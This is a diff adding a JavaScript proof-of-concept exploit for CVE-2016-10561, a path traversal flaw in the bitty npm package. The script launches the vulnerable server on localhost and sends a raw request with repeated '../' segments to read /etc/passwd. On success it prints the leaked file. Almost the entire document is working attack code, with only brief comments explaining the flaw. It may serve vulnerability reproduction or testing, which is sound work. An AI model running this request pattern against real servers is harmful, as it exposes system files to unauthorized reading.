@@ -1,0 +1,36 @@
+```javascript
+// CVE-2016-10561: bitty <=0.1.0 path traversal
+// The `file` handler builds filepath = path.join(program.directory, req.url)
+// and passes it straight to fs.exists/fs.readFile with no sanitization,
+// so a request path containing "../" segments escapes the served directory.
+
+const net = require('net');
+
+// Configure bitty's CLI args before requiring it (it parses process.argv on load).
+process.argv = [process.argv[0], 'bitty', '-p', '4123'];
+require('bitty'); // starts the vulnerable HTTP server on 127.0.0.1:4123
+
+setTimeout(() => {
+  const socket = net.connect(4123, '127.0.0.1', () => {
+    // Raw socket write preserves the literal "../" sequences in req.url
+    // (unlike http.get, which normalizes dot-segments before sending).
+    socket.write(
+      'GET /../../../../../../../../../../etc/passwd HTTP/1.1\r\n' +
+      'Host: localhost\r\n' +
+      'Connection: close\r\n\r\n'
+    );
+  });
+
+  let data = '';
+  socket.on('data', chunk => (data += chunk));
+  socket.on('end', () => {
+    console.log('[+] Path traversal succeeded, leaked file contents:\n');
+    console.log(data);
+    process.exit(0);
+  });
+  socket.on('error', err => {
+    console.error('[-] Exploit failed:', err.message);
+    process.exit(1);
+  });
+}, 1000);
+```
